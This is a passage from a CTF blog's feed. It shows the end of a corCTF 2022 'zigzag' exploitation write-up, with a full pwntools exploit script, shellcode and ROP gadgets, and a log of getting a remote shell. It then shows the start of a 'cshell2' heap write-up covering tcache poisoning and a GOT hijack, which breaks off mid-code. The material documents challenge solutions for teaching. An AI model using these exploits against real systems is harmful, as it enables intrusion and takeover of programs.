<span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x203147</span><span class="p">)</span> \ <span class="c1"># pop rdi ; ret</span>
        <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># target area for the shellcode</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20351b</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># pop rsi ; ret</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># length</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x201fcf</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># pop rax ; syscall</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># SYS_mprotect</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">))</span> <span class="c1"># jump on the shellcode + PROFIT</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x202d16</span><span class="p">))</span> <span class="c1"># valid return address</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000203715</span><span class="p">))</span> <span class="c1"># magic gadget</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
[+] Opening connection to be.ax on port 31278: Done
[*] stack: 0x7ffc2ca48ae8
[*] Loaded 37 cached gadgets for 'zigzag'
[*] Using sigreturn for 'SYS_execve'
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
zigzag
$ cat flag.txt
corctf{bl4Z1nGlY_f4sT!!}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;zigzag&#39;</span><span class="p">)</span>
<span class="c1"># pwn.context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;] </span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;vv&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x0000000000201fcf : pop rax ; syscall
</span><span class="s2">0x0000000000203147 : pop rdi ; ret
</span><span class="s2">0x000000000020351b : pop rsi ; ret
</span><span class="s2">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span class="s2">0x0000000000201e09 : ret
</span><span class="s2">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x208000</span><span class="o">+</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x203147</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20351b</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x201fcf</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">))</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x202d16</span><span class="p">))</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000203715</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&#39;
</span><span class="s2">    Arch:     amd64-64-little
</span><span class="s2">    RELRO:    No RELRO
</span><span class="s2">    Stack:    No canary found
</span><span class="s2">    NX:       NX enabled
</span><span class="s2">    PIE:      No PIE (0x200000)
</span><span class="s2">[+] Opening connection to be.ax on port 31278: Done
</span><span class="s2">[*] stack: 0x7ffe21d2cc68
</span><span class="s2">[*] Loaded 37 cached gadgets for &#39;zigzag&#39;
</span><span class="s2">[*] Using sigreturn for &#39;SYS_execve&#39;
</span><span class="s2">[*] Switching to interactive mode
</span><span class="s2">$ id
</span><span class="s2">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
</span><span class="s2">$ cat flag.txt
</span><span class="s2">corctf{bl4Z1nGlY_f4sT!!}
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/corCTF" term="corCTF" label="corCTF" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/zig" term="zig" label="zig" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[corCTF 2022 - pwn] cshell2]]></title>
            <link href="https://nasm.re/posts/cshell2/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cshell2/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-08-07T00:00:00+00:00</published>
            <updated>2022-08-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p><code>cshell2</code> is a heap challenge I did during the <a
  class="gblog-markdown__link"
  href="https://ctftime.org/event/1656"
  
  >corCTF 2022</a
> event. It was pretty classic so I will not describe a lot.
If you begin with heap challenges, I advice you to read <a
  class="gblog-markdown__link"
  href="https://ret2school.github.io/tags/heap/"
  
  >previous heap writeup</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Fill tcache.</li>
<li>Heap overflow in <code>edit</code> on the <code>bio</code> field which allows to leak the address of the unsortedbin.</li>
<li>Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.</li>
<li>Hiijack GOT entry of <code>free</code> to <code>system</code>.</li>
<li>Call <code>free(&quot;/bin/sh&quot;)</code>.</li>
<li>PROFIT</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="reverse-engineering">
        Reverse Engineering
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse Engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Let&rsquo;s take a look at the provided binary and libc:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (GNU libc) development release version 2.36.9000.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.1.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/libc/bugs.html&gt;.
$ checksec --file cshell2
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
</code></pre><p>A very recent libc plus a non PIE-based binary without <code>FULL RELRO</code>. Thus we could think to some GOT hiijacking stuff directly on the binary. Let&rsquo;s take a look at the <code>add</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">idx_1</span><span class="p">;</span> <span class="c1">// ebx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Fh] [rbp-21h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter size (1032 minimum): &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xEu</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x407</span> <span class="o">||</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Error with either index or size...&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">idx_1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
    <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx_1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfuly added!&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input firstname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input middlename: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
